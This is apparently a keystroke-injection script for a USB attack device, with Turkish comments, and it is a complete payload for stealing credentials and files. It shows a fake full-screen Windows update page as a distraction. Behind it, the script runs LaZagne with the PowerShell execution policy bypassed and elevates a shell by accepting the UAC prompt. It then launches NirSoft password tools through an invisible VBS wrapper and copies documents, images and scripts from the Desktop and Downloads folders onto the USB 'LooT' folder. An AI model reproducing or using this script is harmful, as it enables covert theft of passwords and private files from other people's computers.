// 3in1-TriggerAct

delay(5000); // USB Bağlanmasını Bekliyor
layout("US"); // US Klavye Düzeni Seçiyor
delay(3000); // USB Adaptasyonu Bekleniyor
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
press("ALT F4"); // Açılan USB Sayfası Kapatılıyor
delay(500);

// LaZagne-PasswordGrabber, NirSoft_Passwd, StealFiles in Few Seconds
typingSpeed(0,0);	// Hızlı Yazması İçin

// Fake Update Sayfası Açılıyor
press("GUI R");  // Windows + R
delay(500);
type("iexplore -k http://fakeupdate.net/win10u/index.html\n") // İnternet Explore Tam Ekran Açılıyor
delay(500);

// LaZagne-PasswordGrabber
press("GUI r"); // Windows + R
delay(500);
type("cmd /C start /MIN powershell -executionpolicy Bypass .((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'\\LaZagne\\LaZagne.ps1')\n")
delay(1000);

// NirSoft_Passwd
press("WIN"); // Başlat
delay(500);
type("powershell");
delay(500);
press("CTRL SHIFT ENTER");
delay(500);
press("ALT y");
delay(750);
type("$usbPath =((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'NirSoft\')\n"); //4GB_Disk >> USB Adı -- NirSoft >> Klasör Adı
delay(500);
type("cd $usbPath\n");
delay(500);
type("Expand-Archive -Path NirSoft_Passwd.zip -DestinationPath ../../LooT/NirSoft/$env:COMPUTERNAME/\n");
delay(500);
type("cd ../../LooT/NirSoft/$env:COMPUTERNAME/\n");
delay(500);
type("C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat\n");
delay(500);
type("exit\n");   // PowerShell Kapatılıyor
delay(500);

// StealFiles
press("GUI r") // Windows + R
delay(500) 
type("powershell");
delay(500);
press("CTRL SHIFT ENTER");
delay(500);
press("ALT y");
delay(750);
type("$usbPath = ((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'\\LooT\\Steal\\')\n");
type("New-Item -Path $usbpath/$env:COMPUTERNAME/ -ItemType Directory\n") // Yeni Klasör Oluşturuluyor >> $usbpath/$env:COMPUTERNAME/
var filetypes = ["jpg", "png", "txt", "pdf", "html", "ps1", "py"]
for (var i = 0; i < filetypes.length; i++) {
	type("copy *." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy */*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
    type("copy Downloads/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy Desktop/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
  	type("copy Desktop/*/*." + filetypes[i] + " $usbpath/$env:COMPUTERNAME/\n")
}
type("exit\n");  // PowerShell Kapatılıyor

// Fake Update Sayfası Kapatılıyor
delay(5000);
press("ALT F4");

// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzenini Değiştiriliyor
delay(500);
// @KekikAkademi Edit #